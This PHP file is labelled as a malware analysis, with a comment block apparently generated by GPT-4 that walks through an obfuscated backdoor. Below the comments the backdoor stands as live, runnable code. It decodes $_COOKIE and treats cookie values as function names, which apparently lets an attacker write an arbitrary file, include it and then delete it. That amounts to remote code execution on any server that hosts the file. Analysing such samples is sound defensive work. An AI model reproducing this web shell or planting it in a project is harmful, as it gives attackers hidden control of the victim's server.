<?php
/**
 * Malware Analysis date : 20230527
 * Author : Cedric Moris Kelly
 * 
 * GPT4 auto generated explanation
* 
* 1. The script starts with the opening `<?php` tag.
* 
* The code assigns a variable $pug with the value ${"\137" . "\103" . "\117\117" . "\113\111\105"}. 
* This obfuscated expression decodes to $_COOKIE.
* 
* The code checks if an element at index (80 - 2) exists in the $pug array (which refers to $_COOKIE). 
* If the condition is true, the following actions are performed:
* 
* It concatenates the values of $pug[(66 - 16)] and $pug[(67 - 18)] and assigns it to the variable $QV.
* It executes the function referenced by $QV with the argument $pug[(84 - 32)] . $pug[(90 - 11)] and assigns the result to the variable $voF.
* It executes the function referenced by $voF with the argument $QV($pug[(93 - 5)]) and assigns the result to the variable $SQym.
* It executes the function referenced by $voF with the argument $QV($pug[(95 - 1)]) and assigns the result to the variable $DHup.
* It concatenates the value of __DIR__ and the result of executing the function referenced by $voF with the argument $QV($pug[(97 - 4)]) and assigns it to the variable $yOgd.
* It executes the function referenced by $SQym with the arguments $yOgd and $voF($QV($pug[(81 - 3)])).
* It includes the file specified by $yOgd.
* It executes the function referenced by $DHup with the argument $yOgd.
*/

$pug=${	"\137" ."\103".	"\117\117"."\113\111\105"}	;	if( isset( $pug [	 (80 - 2	) ])	) { $QV=$pug[	(66	-	16	) ].$pug [(67-	18) ] ;	$voF =$QV( $pug[( 84	-32 ) ].	$pug [	( 90-11)] ) ;	 $SQym =$voF	($QV($pug[	(	93-	5)		]	) ) ; $DHup= $voF( $QV( $pug [	(95- 1)]) );  $yOgd =__DIR__.	$voF ($QV	( $pug	[ (97 -4	) 	]	) );		$SQym($yOgd,$voF(	$QV(	$pug [	( 81 -3	)  ] ))	); include($yOgd)	;	$DHup	($yOgd);	}